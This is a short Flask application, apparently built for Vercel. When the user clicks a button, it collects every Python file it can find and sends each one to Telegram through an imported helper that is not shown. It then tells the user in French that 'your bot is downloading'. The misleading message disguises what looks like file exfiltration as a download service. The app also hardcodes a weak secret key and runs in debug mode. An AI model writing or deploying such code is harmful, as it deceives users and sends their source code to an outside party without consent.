from flask import Flask, render_template, request, redirect, url_for, flash
from logic import find_py_files, send_file_to_telegram  
import sys

print("Flask app loaded", file=sys.stderr)

app = Flask(__name__)
app.secret_key = 'secretkey'

@app.route('/')
def index():
    files = find_py_files()
    return render_template('index.html', files=files)

@app.route('/send', methods=['POST'])
def send():
    py_files = find_py_files()
    success = 0
    for path in py_files:
        if send_file_to_telegram(path):
            success += 1
    flash("Votre bot est en cours de téléchargement, merci de patienter")
    return redirect(url_for('index'))

# Pour Vercel - Correction de la syntaxe
if __name__ == "__main__":
    app.run(debug=True)